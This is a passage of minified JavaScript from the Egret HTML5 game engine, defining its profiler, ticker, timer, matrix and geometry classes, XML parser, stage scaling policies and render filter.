            null == b.instance && (b.instance = new b);
            return b.instance
        };
        b.prototype.stop = function () {
            if (this._isRunning) {
                this._isRunning = !1;
                c.Ticker.getInstance().unregister(this.update, this);
                var a = c.MainContext.instance;
                a.removeEventListener(c.Event.ENTER_FRAME,
                    this.onEnterFrame, this);
                a.removeEventListener(c.Event.RENDER, this.onStartRender, this);
                a.removeEventListener(c.Event.FINISH_RENDER, this.onFinishRender, this);
                a.removeEventListener(c.Event.FINISH_UPDATE_TRANSFORM, this.onFinishUpdateTransform, this)
            }
        };
        b.prototype.run = function () {
            null == this._txt && (this._txt = new c.TextField, this._txt.size = 28, this._txt.multiline = !0, this._txt._parent = new c.DisplayObjectContainer);
            if (!this._isRunning) {
                this._isRunning = !0;
                c.Ticker.getInstance().register(this.update, this);
                var a =
                    c.MainContext.instance;
                a.addEventListener(c.Event.ENTER_FRAME, this.onEnterFrame, this);
                a.addEventListener(c.Event.RENDER, this.onStartRender, this);
                a.addEventListener(c.Event.FINISH_RENDER, this.onFinishRender, this);
                a.addEventListener(c.Event.FINISH_UPDATE_TRANSFORM, this.onFinishUpdateTransform, this)
            }
        };
        b.prototype._drawProfiler = function () {
            this._txt._updateTransform();
            this._txt._draw(c.MainContext.instance.rendererContext)
        };
        b.prototype._setTxtFontSize = function (a) {
            this._txt.size = a
        };
        b.prototype.onEnterFrame =
            function (a) {
                this._lastTime = c.getTimer()
            };
        b.prototype.onStartRender = function (a) {
            a = c.getTimer();
            this._logicPerformanceCost = a - this._lastTime;
            this._lastTime = a
        };
        b.prototype.onFinishUpdateTransform = function (a) {
            a = c.getTimer();
            this._updateTransformPerformanceCost = a - this._lastTime;
            this._lastTime = a
        };
        b.prototype.onFinishRender = function (a) {
            a = c.getTimer();
            this._renderPerformanceCost = a - this._lastTime;
            this._lastTime = a
        };
        b.prototype.update = function (a) {
            this._tick++;
            this._totalDeltaTime += a;
            if (this._totalDeltaTime >=
                this._maxDeltaTime) {
                a = (this._preDrawCount - 3).toString();
                var e = Math.ceil(this._logicPerformanceCost).toString() + "," + Math.ceil(this._updateTransformPerformanceCost).toString() + "," + Math.ceil(this._renderPerformanceCost).toString() + "," + Math.ceil(c.MainContext.instance.rendererContext.renderCost).toString();
                this._txt.text = "draw:" + a + "\ncost:" + e + "\nFPS:" + Math.floor(1E3 * this._tick / this._totalDeltaTime).toString();
                this._tick = this._totalDeltaTime = 0
            }
            this._preDrawCount = 0
        };
        b.prototype.onDrawImage = function () {
            this._preDrawCount++
        };
        return b
    }();
    c.Profiler = d;
    d.prototype.__class__ = "egret.Profiler"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._timeScale = 1;
            this._paused = !1;
            this.callBackList = [];
            null != a.instance && c.Logger.fatalWithErrorId(1002)
        }

        __extends(a, b);
        a.prototype.run = function () {
            c.__START_TIME = (new Date).getTime();
            c.MainContext.instance.deviceContext.executeMainLoop(this.update, this)
        };
        a.prototype.update = function (e) {
            if (!this._paused) {
                var a = this.callBackList.concat(), b = a.length;
                e *= this._timeScale;
                e *= this._timeScale;
                for (var c = 0; c < b; c++) {
                    var d = a[c];
                    d.listener.call(d.thisObject,
                        e)
                }
            }
        };
        a.prototype.register = function (e, a, b) {
            void 0 === b && (b = 0);
            this._insertEventBin(this.callBackList, e, a, b)
        };
        a.prototype.unregister = function (e, a) {
            this._removeEventBin(this.callBackList, e, a)
        };
        a.prototype.setTimeout = function (e, a, b) {
            for (var d = [], f = 3; f < arguments.length; f++)d[f - 3] = arguments[f];
            c.Logger.warningWithErrorId(1003);
            c.setTimeout.apply(null, [e, a, b].concat(d))
        };
        a.prototype.setTimeScale = function (e) {
            this._timeScale = e
        };
        a.prototype.getTimeScale = function () {
            return this._timeScale
        };
        a.prototype.pause =
            function () {
                this._paused = !0
            };
        a.prototype.resume = function () {
            this._paused = !1
        };
        a.getInstance = function () {
            null == a.instance && (a.instance = new a);
            return a.instance
        };
        return a
    }(c.EventDispatcher);
    c.Ticker = d;
    d.prototype.__class__ = "egret.Ticker"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.LEFT = "left";
        b.RIGHT = "right";
        b.CENTER = "center";
        b.JUSTIFY = "justify";
        b.CONTENT_JUSTIFY = "contentJustify";
        return b
    }();
    c.HorizontalAlign = d;
    d.prototype.__class__ = "egret.HorizontalAlign"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.TOP = "top";
        b.BOTTOM = "bottom";
        b.MIDDLE = "middle";
        b.JUSTIFY = "justify";
        b.CONTENT_JUSTIFY = "contentJustify";
        return b
    }();
    c.VerticalAlign = d;
    d.prototype.__class__ = "egret.VerticalAlign"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(e, a) {
            void 0 === a && (a = 0);
            b.call(this);
            this._currentCount = 0;
            this._running = !1;
            this.lastTime = 0;
            this.delay = e;
            this.repeatCount = a
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "currentCount", {
            get: function () {
                return this._currentCount
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "running", {
            get: function () {
                return this._running
            }, enumerable: !0, configurable: !0
        });
        a.prototype.reset = function () {
            this.stop();
            this._currentCount = 0
        };
        a.prototype.start = function () {
            this._running ||
            (this.lastTime = c.getTimer(), c.Ticker.getInstance().register(this.onEnterFrame, this), this._running = !0)
        };
        a.prototype.stop = function () {
            this._running && (c.Ticker.getInstance().unregister(this.onEnterFrame, this), this._running = !1)
        };
        a.prototype.onEnterFrame = function (e) {
            e = c.getTimer();
            e - this.lastTime > this.delay && (this.lastTime = e, this._currentCount++, c.TimerEvent.dispatchTimerEvent(this, c.TimerEvent.TIMER), 0 < this.repeatCount && this._currentCount >= this.repeatCount && (this.stop(), c.TimerEvent.dispatchTimerEvent(this,
                c.TimerEvent.TIMER_COMPLETE)))
        };
        return a
    }(c.EventDispatcher);
    c.Timer = d;
    d.prototype.__class__ = "egret.Timer"
})(egret || (egret = {}));
(function (c) {
    function d(b) {
        b = b.prototype ? b.prototype : Object.getPrototypeOf(b);
        if (b.hasOwnProperty("__class__"))return b.__class__;
        var a = b.constructor.toString(), e = a.indexOf("("), a = a.substring(9, e);
        Object.defineProperty(b, "__class__", {value: a, enumerable: !1, writable: !0});
        return a
    }

    c.getQualifiedClassName = d;
    c.getQualifiedSuperclassName = function (b) {
        b = b.prototype ? b.prototype : Object.getPrototypeOf(b);
        if (b.hasOwnProperty("__superclass__"))return b.__superclass__;
        var a = Object.getPrototypeOf(b);
        if (null == a)return null;
        a = d(a.constructor);
        if (!a)return null;
        Object.defineProperty(b, "__superclass__", {value: a, enumerable: !1, writable: !0});
        return a
    }
})(egret || (egret = {}));
(function (c) {
    var d = {};
    c.getDefinitionByName = function (b) {
        if (!b)return null;
        var a = d[b];
        if (a)return a;
        for (var e = b.split("."), q = e.length, a = __global, c = 0; c < q; c++)if (a = a[e[c]], !a)return null;
        return d[b] = a
    }
})(egret || (egret = {}));
var __global = __global || this;
(function (c) {
    function d(e) {
        for (var a in b) {
            var c = b[a];
            c.delay -= e;
            0 >= c.delay && (c.listener.apply(c.thisObject, c.params), delete b[a])
        }
    }

    var b = {}, a = 0;
    c.setTimeout = function (e, q, n) {
        for (var h = [], f = 3; f < arguments.length; f++)h[f - 3] = arguments[f];
        h = {listener: e, thisObject: q, delay: n, params: h};
        0 == a && c.Ticker.getInstance().register(d, null);
        a++;
        b[a] = h;
        return a
    };
    c.clearTimeout = function (e) {
        delete b[e]
    }
})(egret || (egret = {}));
(function (c) {
    c.hasDefinition = function (d) {
        return c.getDefinitionByName(d) ? !0 : !1
    }
})(egret || (egret = {}));
(function (c) {
    c.toColorString = function (c) {
        if (isNaN(c) || 0 > c)c = 0;
        16777215 < c && (c = 16777215);
        for (c = c.toString(16).toUpperCase(); 6 > c.length;)c = "0" + c;
        return "#" + c
    }
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(e, a, c, d, f, g) {
            void 0 === e && (e = 1);
            void 0 === a && (a = 0);
            void 0 === c && (c = 0);
            void 0 === d && (d = 1);
            void 0 === f && (f = 0);
            void 0 === g && (g = 0);
            b.call(this);
            this.a = e;
            this.b = a;
            this.c = c;
            this.d = d;
            this.tx = f;
            this.ty = g
        }

        __extends(a, b);
        a.prototype.prepend = function (e, a, b, c, d, g) {
            var k = this.tx;
            if (1 != e || 0 != a || 0 != b || 1 != c) {
                var l = this.a, m = this.c;
                this.a = l * e + this.b * b;
                this.b = l * a + this.b * c;
                this.c = m * e + this.d * b;
                this.d = m * a + this.d * c
            }
            this.tx = k * e + this.ty * b + d;
            this.ty = k * a + this.ty * c + g;
            return this
        };
        a.prototype.append =
            function (e, a, b, c, d, g) {
                var k = this.a, l = this.b, m = this.c, p = this.d;
                if (1 != e || 0 != a || 0 != b || 1 != c)this.a = e * k + a * m, this.b = e * l + a * p, this.c = b * k + c * m, this.d = b * l + c * p;
                this.tx = d * k + g * m + this.tx;
                this.ty = d * l + g * p + this.ty;
                return this
            };
        a.prototype.prependTransform = function (e, a, b, d, f, g, k, l, m) {
            if (f % 360) {
                var p = c.NumberUtils.cos(f);
                f = c.NumberUtils.sin(f)
            } else p = 1, f = 0;
            if (l || m)this.tx -= l, this.ty -= m;
            g || k ? (this.prepend(p * b, f * b, -f * d, p * d, 0, 0), this.prepend(c.NumberUtils.cos(k), c.NumberUtils.sin(k), -c.NumberUtils.sin(g), c.NumberUtils.cos(g),
                e, a)) : this.prepend(p * b, f * b, -f * d, p * d, e, a);
            return this
        };
        a.prototype.appendTransform = function (e, a, b, d, f, g, k, l, m) {
            if (f % 360) {
                var p = c.NumberUtils.cos(f);
                f = c.NumberUtils.sin(f)
            } else p = 1, f = 0;
            g || k ? (this.append(c.NumberUtils.cos(k), c.NumberUtils.sin(k), -c.NumberUtils.sin(g), c.NumberUtils.cos(g), e, a), this.append(p * b, f * b, -f * d, p * d, 0, 0)) : this.append(p * b, f * b, -f * d, p * d, e, a);
            if (l || m)this.tx -= l * this.a + m * this.c, this.ty -= l * this.b + m * this.d;
            return this
        };
        a.prototype.rotate = function (e) {
            var a = Math.cos(e);
            e = Math.sin(e);
            var b =
                this.a, c = this.c, d = this.tx;
            this.a = b * a - this.b * e;
            this.b = b * e + this.b * a;
            this.c = c * a - this.d * e;
            this.d = c * e + this.d * a;
            this.tx = d * a - this.ty * e;
            this.ty = d * e + this.ty * a;
            return this
        };
        a.prototype.skew = function (e, a) {
            this.append(c.NumberUtils.cos(a), c.NumberUtils.sin(a), -c.NumberUtils.sin(e), c.NumberUtils.cos(e), 0, 0);
            return this
        };
        a.prototype.scale = function (e, a) {
            this.a *= e;
            this.d *= a;
            this.c *= e;
            this.b *= a;
            this.tx *= e;
            this.ty *= a;
            return this
        };
        a.prototype.translate = function (e, a) {
            this.tx += e;
            this.ty += a;
            return this
        };
        a.prototype.identity =
            function () {
                this.a = this.d = 1;
                this.b = this.c = this.tx = this.ty = 0;
                return this
            };
        a.prototype.identityMatrix = function (e) {
            this.a = e.a;
            this.b = e.b;
            this.c = e.c;
            this.d = e.d;
            this.tx = e.tx;
            this.ty = e.ty;
            return this
        };
        a.prototype.invert = function () {
            var e = this.a, a = this.b, b = this.c, c = this.d, d = this.tx, g = e * c - a * b;
            this.a = c / g;
            this.b = -a / g;
            this.c = -b / g;
            this.d = e / g;
            this.tx = (b * this.ty - c * d) / g;
            this.ty = -(e * this.ty - a * d) / g;
            return this
        };
        a.transformCoords = function (e, a, b) {
            var d = c.Point.identity;
            d.x = e.a * a + e.c * b + e.tx;
            d.y = e.d * b + e.b * a + e.ty;
            return d
        };
        a.prototype.toArray = function (e) {
            this.array || (this.array = new Float32Array(9));
            e ? (this.array[0] = this.a, this.array[1] = this.b, this.array[2] = 0, this.array[3] = this.c, this.array[4] = this.d, this.array[5] = 0, this.array[6] = this.tx, this.array[7] = this.ty) : (this.array[0] = this.a, this.array[1] = this.b, this.array[2] = this.tx, this.array[3] = this.c, this.array[4] = this.d, this.array[5] = this.ty, this.array[6] = 0, this.array[7] = 0);
            this.array[8] = 1;
            return this.array
        };
        a.identity = new a;
        a.DEG_TO_RAD = Math.PI / 180;
        return a
    }(c.HashObject);
    c.Matrix = d;
    d.prototype.__class__ = "egret.Matrix"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(e, a) {
            void 0 === e && (e = 0);
            void 0 === a && (a = 0);
            b.call(this);
            this.x = e;
            this.y = a
        }

        __extends(a, b);
        a.prototype.clone = function () {
            return new a(this.x, this.y)
        };
        a.prototype.equals = function (e) {
            return this.x == e.x && this.y == e.y
        };
        a.distance = function (e, a) {
            return Math.sqrt((e.x - a.x) * (e.x - a.x) + (e.y - a.y) * (e.y - a.y))
        };
        a.identity = new a(0, 0);
        return a
    }(c.HashObject);
    c.Point = d;
    d.prototype.__class__ = "egret.Point"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(e, a, c, d) {
            void 0 === e && (e = 0);
            void 0 === a && (a = 0);
            void 0 === c && (c = 0);
            void 0 === d && (d = 0);
            b.call(this);
            this.x = e;
            this.y = a;
            this.width = c;
            this.height = d
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "right", {
            get: function () {
                return this.x + this.width
            }, set: function (e) {
                this.width = e - this.x
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "bottom", {
            get: function () {
                return this.y + this.height
            }, set: function (e) {
                this.height = e - this.y
            }, enumerable: !0, configurable: !0
        });
        a.prototype.initialize = function (e, a, b, c) {
            this.x = e;
            this.y = a;
            this.width = b;
            this.height = c;
            return this
        };
        a.prototype.contains = function (e, a) {
            return this.x <= e && this.x + this.width >= e && this.y <= a && this.y + this.height >= a
        };
        a.prototype.intersects = function (e) {
            return Math.max(this.x, e.x) <= Math.min(this.right, e.right) && Math.max(this.y, e.y) <= Math.min(this.bottom, e.bottom)
        };
        a.prototype.setEmpty = function () {
            this.height = this.width = this.y = this.x = 0
        };
        a.prototype.clone = function () {
            return new a(this.x, this.y, this.width, this.height)
        };
        a.prototype.containsPoint = function (e) {
            return this.x < e.x && this.x + this.width > e.x && this.y < e.y && this.y + this.height > e.y ? !0 : !1
        };
        a.identity = new a(0, 0, 0, 0);
        return a
    }(c.HashObject);
    c.Rectangle = d;
    d.prototype.__class__ = "egret.Rectangle"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._isSupportDOMParser = this._xmlDict = this._parser = null;
            this._xmlDict = {};
            window.DOMParser ? (this._isSupportDOMParser = !0, this._parser = new DOMParser) : this._isSupportDOMParser = !1
        }

        __extends(a, b);
        a.getInstance = function () {
            a._instance || (a._instance = new a);
            return a._instance
        };
        a.prototype.parserXML = function (e) {
            for (var a = 0; "\n" == e.charAt(a) || "\t" == e.charAt(a) || "\r" == e.charAt(a) || " " == e.charAt(a);)a++;
            0 != a && (e = e.substring(a, e.length));
            this._isSupportDOMParser ?
                a = this._parser.parseFromString(e, "text/xml") : (a = new ActiveXObject("Microsoft.XMLDOM"), a.async = "false", a.loadXML(e));
            null == a && c.Logger.infoWithErrorId(1015);
            return a
        };
        a._instance = null;
        return a
    }(c.HashObject);
    c.SAXParser = d;
    d.prototype.__class__ = "egret.SAXParser"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (e) {
        function b() {
            e.call(this);
            this._designHeight = this._designWidth = 0;
            this._scaleY = this._scaleX = 1;
            this._stageHeight = this._stageWidth = this._offSetY = 0
        }

        __extends(b, e);
        b.getInstance = function () {
            null == b.instance && (a.initialize(), b.instance = new b);
            return b.instance
        };
        b.prototype.setDesignSize = function (e, a, b) {
            this._designWidth = e;
            this._designHeight = a;
            b && (c.Logger.warningWithErrorId(1001), this._setResolutionPolicy(b))
        };
        b.prototype._setResolutionPolicy = function (e) {
            this._resolutionPolicy =
                e;
            e.init(this);
            e._apply(this, this._designWidth, this._designHeight)
        };
        b.prototype.getScaleX = function () {
            return this._scaleX
        };
        b.prototype.getScaleY = function () {
            return this._scaleY
        };
        b.prototype.getOffSetY = function () {
            return this._offSetY
        };
        b.canvas_name = "egretCanvas";
        b.canvas_div_name = "gameDiv";
        return b
    }(c.HashObject);
    c.StageDelegate = d;
    d.prototype.__class__ = "egret.StageDelegate";
    var b = function () {
        function e(a, b) {
            this._containerStrategy = a;
            this._contentStrategy = b
        }

        e.prototype.init = function (e) {
            this._containerStrategy.init(e);
            this._contentStrategy.init(e)
        };
        e.prototype._apply = function (e, a, b) {
            this._containerStrategy._apply(e, a, b);
            this._contentStrategy._apply(e, a, b)
        };
        return e
    }();
    c.ResolutionPolicy = b;
    b.prototype.__class__ = "egret.ResolutionPolicy";
    var a = function () {
        function a() {
        }

        a.initialize = function () {
            a.EQUAL_TO_FRAME = new e
        };
        a.prototype.init = function (e) {
        };
        a.prototype._apply = function (e, a, b) {
        };
        a.prototype._setupContainer = function () {
            var e = document.body, a;
            e && (a = e.style) && (a.paddingTop = a.paddingTop || "0px", a.paddingRight = a.paddingRight ||
            "0px", a.paddingBottom = a.paddingBottom || "0px", a.paddingLeft = a.paddingLeft || "0px", a.borderTop = a.borderTop || "0px", a.borderRight = a.borderRight || "0px", a.borderBottom = a.borderBottom || "0px", a.borderLeft = a.borderLeft || "0px", a.marginTop = a.marginTop || "0px", a.marginRight = a.marginRight || "0px", a.marginBottom = a.marginBottom || "0px", a.marginLeft = a.marginLeft || "0px")
        };
        return a
    }();
    c.ContainerStrategy = a;
    a.prototype.__class__ = "egret.ContainerStrategy";
    var e = function (e) {
        function a() {
            e.apply(this, arguments)
        }

        __extends(a,
            e);
        a.prototype._apply = function (e) {
            this._setupContainer()
        };
        return a
    }(a);
    c.EqualToFrame = e;
    e.prototype.__class__ = "egret.EqualToFrame";
    b = function () {
        function e() {
        }

        e.prototype.init = function (e) {
        };
        e.prototype._apply = function (e, a, b) {
        };
        e.prototype.setEgretSize = function (e, a, b, q, n, m) {
            void 0 === m && (m = 0);
            c.StageDelegate.getInstance()._stageWidth = Math.round(e);
            c.StageDelegate.getInstance()._stageHeight = Math.round(a);
            e = document.getElementById(d.canvas_div_name);
            e.style.width = b + "px";
            e.style.height = q + "px";
            e.style.top =
                m + "px"
        };
        e.prototype._getClientWidth = function () {
            return document.documentElement.clientWidth
        };
        e.prototype._getClientHeight = function () {
            return document.documentElement.clientHeight
        };
        return e
    }();
    c.ContentStrategy = b;
    b.prototype.__class__ = "egret.ContentStrategy";
    var q = function (e) {
        function a(b) {
            void 0 === b && (b = 0);
            e.call(this);
            this.minWidth = NaN;
            this.minWidth = b
        }

        __extends(a, e);
        a.prototype._apply = function (e, a, b) {
            a = this._getClientWidth();
            var q = this._getClientHeight(), c = q / b, d = a / c, n = 1;
            0 != this.minWidth && (n = Math.min(1,
                d / this.minWidth));
            this.setEgretSize(d / n, b, a, q * n);
            e._scaleX = c * n;
            e._scaleY = c * n
        };
        return a
    }(b);
    c.FixedHeight = q;
    q.prototype.__class__ = "egret.FixedHeight";
    q = function (e) {
        function a(b) {
            void 0 === b && (b = 0);
            e.call(this);
            this.minHeight = NaN;
            this.minHeight = b
        }

        __extends(a, e);
        a.prototype._apply = function (e, a, b) {
            b = this._getClientWidth();
            var q = this._getClientHeight(), c = b / a, d = q / c, n = 1;
            0 != this.minHeight && (n = Math.min(1, d / this.minHeight));
            this.setEgretSize(a, d / n, b * n, q, b * (1 - n) / 2);
            e._scaleX = c * n;
            e._scaleY = c * n
        };
        return a
    }(b);
    c.FixedWidth =
        q;
    q.prototype.__class__ = "egret.FixedWidth";
    q = function (e) {
        function a(b, q) {
            e.call(this);
            this.width = b;
            this.height = q
        }

        __extends(a, e);
        a.prototype._apply = function (e, a, b) {
            b = this.width;
            var q = this.height, c = b / a;
            this.setEgretSize(a, q / c, b, q);
            e._scaleX = c;
            e._scaleY = c
        };
        return a
    }(b);
    c.FixedSize = q;
    q.prototype.__class__ = "egret.FixedSize";
    q = function (e) {
        function a() {
            e.call(this)
        }

        __extends(a, e);
        a.prototype._apply = function (e, a, b) {
            this.setEgretSize(a, b, a, b, Math.floor((a - a) / 2));
            e._scaleX = 1;
            e._scaleY = 1
        };
        return a
    }(b);
    c.NoScale =
        q;
    q.prototype.__class__ = "egret.NoScale";
    q = function (e) {
        function a() {
            e.call(this)
        }

        __extends(a, e);
        a.prototype._apply = function (e, a, b) {
            var q = this._getClientWidth(), c = this._getClientHeight(), d = q, n = c, h = d / a < n / b ? d / a : n / b, d = a * h, n = b * h, q = Math.floor((q - d) / 2);
            e._offSetY = Math.floor((c - n) / 2);
            this.setEgretSize(a, b / 1, 1 * d, n, q, e._offSetY);
            e._scaleX = 1 * h;
            e._scaleY = 1 * h
        };
        return a
    }(b);
    c.ShowAll = q;
    q.prototype.__class__ = "egret.ShowAll";
    b = function (e) {
        function a() {
            e.call(this)
        }

        __extends(a, e);
        a.prototype._apply = function (e, a, b) {
            var q =
                this._getClientWidth(), c = this._getClientHeight(), q = q / a, c = c / b;
            this.setEgretSize(a, b, a * q, b * c);
            e._scaleX = q;
            e._scaleY = c
        };
        return a
    }(b);
    c.FullScreen = b;
    b.prototype.__class__ = "egret.FullScreen"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._originalData = {};
            this._drawAreaList = []
        }

        __extends(a, b);
        a.getInstance = function () {
            null == a.instance && (a.instance = new a);
            return a.instance
        };
        a.prototype.addDrawArea = function (e) {
            this._drawAreaList.push(e)
        };
        a.prototype.clearDrawArea = function () {
            this._drawAreaList = []
        };
        a.prototype.drawImage = function (e, b, d, h, f, g, k, l, m, p, r) {
            void 0 === r && (r = void 0);
            k = k || 0;
            l = l || 0;
            var t = b._texture_to_render;
            if (null != t && 0 != g && 0 != f && 0 != m && 0 != p) {
                var s = c.MainContext.instance.rendererContext._texture_scale_factor;
                f /= s;
                g /= s;
                if (0 != this._drawAreaList.length && c.MainContext.instance.rendererContext._cacheCanvasContext) {
                    s = c.DisplayObject.getTransformBounds(b._getSize(a.identityRectangle), b._worldTransform);
                    b._worldBounds.initialize(s.x, s.y, s.width, s.height);
                    s = this._originalData;
                    s.sourceX = d;
                    s.sourceY = h;
                    s.sourceWidth = f;
                    s.sourceHeight = g;
                    s.destX = k;
                    s.destY = l;
                    s.destWidth = m;
                    s.destHeight = p;
                    for (var u = this.getDrawAreaList(), w = 0; w < u.length; w++)if (!this.ignoreRender(b, u[w], s.destX, s.destY)) {
                        e.drawImage(t, d, h, f, g, k, l, m, p, r);
                        break
                    }
                } else e.drawImage(t, d, h, f, g, k, l, m, p, r)
            }
        };
        a.prototype.ignoreRender = function (e, a, b, c) {
            var d = e._worldBounds;
            b *= e._worldTransform.a;
            c *= e._worldTransform.d;
            return d.x + d.width + b <= a.x || d.x + b >= a.x + a.width || d.y + d.height + c <= a.y || d.y + c >= a.y + a.height ? !0 : !1
        };
        a.prototype.getDrawAreaList = function () {
            var e;
            0 == this._drawAreaList.length ? (this._defaultDrawAreaList || (this._defaultDrawAreaList = [new c.Rectangle(0, 0, c.MainContext.instance.stage.stageWidth, c.MainContext.instance.stage.stageHeight)], c.MainContext.instance.stage.addEventListener(c.Event.RESIZE,
                this.onResize, this)), e = this._defaultDrawAreaList) : e = this._drawAreaList;
            return e
        };
        a.prototype.onResize = function () {
            c.MainContext.instance.stage.removeEventListener(c.Event.RESIZE, this.onResize, this);
            this._defaultDrawAreaList = null
        };
        a.identityRectangle = new c.Rectangle;
        return a
    }(c.HashObject);
    c.RenderFilter = d;
    d.prototype.__class__ = "egret.RenderFilter"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.mapClass = function (a, e, b) {
            void 0 === b && (b = "");
            a = this.getKey(a) + "#" + b;
            this.mapClassDic[a] = e
        };
        b.getKey = function (a) {
            return "string" == typeof a ? a : c.getQualifiedClassName(a)
        };
        b.mapValue = function (a, e, b) {
            void 0 === b && (b = "");
            a = this.getKey(a) + "#" + b;
            this.mapValueDic[a] = e
        };
        b.hasMapRule = function (a, e) {
            void 0 === e && (e = "");
            var b = this.getKey(a) + "#" + e;
            return this.mapValueDic[b] || this.mapClassDic[b] ? !0 : !1
        };
        b.getInstance = function (a, e) {
            void 0 === e && (e = "");
            var b = this.getKey(a) + "#" +
                e;
            if (this.mapValueDic[b])return this.mapValueDic[b];
            var d = this.mapClassDic[b];
            if (d)return d = new d, this.mapValueDic[b] = d, delete this.mapClassDic[b], d;
            throw Error(c.getString(1028, b));
        };
        b.mapClassDic = {};
        b.mapValueDic = {};
        return b
    }();
    c.Injector = d;
    d.prototype.__class__ = "egret.Injector"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        return function () {
            this.type = null
        }
    }();
    c.Filter = d;
    d.prototype.__class__ = "egret.Filter"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(e, a) {
            b.call(this);
            this.blurX = e;
            this.blurY = a;
            this.type = "blur"
        }

        __extends(a, b);
        return a
    }(c.Filter);
    c.BlurFilter = d;
    d.prototype.__class__ = "egret.BlurFilter"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.NORMAL = "normal";
        b.ADD = "add";
        return b
    }();
    c.BlendMode = d;
    d.prototype.__class__ = "egret.BlendMode"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this.__hack_local_matrix = null;
            this._sizeDirty = this._normalDirty = !0;
            this._parent = this._texture_to_render = this.name = this._sizeChangeCallTarget = this._sizeChangeCallBack = null;
            this._y = this._x = 0;
            this._scaleY = this._scaleX = 1;
            this._anchorY = this._anchorX = this._anchorOffsetY = this._anchorOffsetX = 0;
            this._visible = !0;
            this._rotation = 0;
            this._alpha = 1;
            this._skewY = this._skewX = 0;
            this._touchEnabled = !1;
            this._scrollRect = this.blendMode = null;
            this._explicitHeight = this._explicitWidth =
                NaN;
            this._hasHeightSet = this._hasWidthSet = !1;
            this._worldBounds = this.mask = null;
            this.worldAlpha = 1;
            this.needDraw = this._isContainer = !1;
            this._hitTestPointTexture = null;
            this._rectH = this._rectW = 0;
            this._stage = null;
            this._cacheAsBitmap = !1;
            this.renderTexture = null;
            this._cacheDirty = !1;
            this._filter = this._colorTransform = null;
            this._worldTransform = new c.Matrix;
            this._worldBounds = new c.Rectangle(0, 0, 0, 0);
            this._cacheBounds = new c.Rectangle(0, 0, 0, 0)
        }

        __extends(a, b);
        a.prototype._setDirty = function () {
            this._normalDirty = !0
        };
        a.prototype.getDirty =
            function () {
                return this._normalDirty || this._sizeDirty
            };
        a.prototype._setParentSizeDirty = function () {
            var e = this._parent;
            !e || e._hasWidthSet || e._hasHeightSet || e._setSizeDirty()
        };
        a.prototype._setSizeDirty = function () {
            this._sizeDirty || (this._sizeDirty = !0, this._setDirty(), this._setCacheDirty(), this._setParentSizeDirty(), null != this._sizeChangeCallBack && (this._sizeChangeCallTarget == this._parent ? this._sizeChangeCallBack.call(this._sizeChangeCallTarget) : this._sizeChangeCallTarget = this._sizeChangeCallBack = null))
        };
        a.prototype._clearDirty = function () {
            this._normalDirty = !1
        };
        a.prototype._clearSizeDirty = function () {
            this._sizeDirty = !1
        };
        Object.defineProperty(a.prototype, "parent", {
            get: function () {
                return this._parent
            }, enumerable: !0, configurable: !0
        });
        a.prototype._parentChanged = function (e) {
            this._parent = e
        };
        Object.defineProperty(a.prototype, "x", {
            get: function () {
                return this._x
            }, set: function (e) {
                this._setX(e)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setX = function (e) {
            c.NumberUtils.isNumber(e) && this._x != e && (this._x = e, this._setDirty(),
                this._setParentSizeDirty())
        };
        Object.defineProperty(a.prototype, "y", {
            get: function () {
                return this._y
            }, set: function (e) {
                this._setY(e)
            }, enumerable: !0, configurable: !0
        });
